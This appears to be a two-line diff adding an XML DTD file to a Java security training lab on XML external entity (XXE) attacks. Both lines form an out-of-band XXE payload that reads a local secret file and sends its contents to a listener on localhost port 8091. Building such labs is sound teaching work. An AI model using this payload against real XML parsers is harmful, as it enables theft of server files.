@@ -1,0 +1,2 @@
+<!ENTITY % payload SYSTEM "file:////C:\\Git\\java\\java-security-labs\\labs\\lab-xxe\\xmls\\mySecretFile">
+<!ENTITY % int "<!ENTITY % trick SYSTEM 'http://127.0.0.1:8091/?p=%payload;'>">
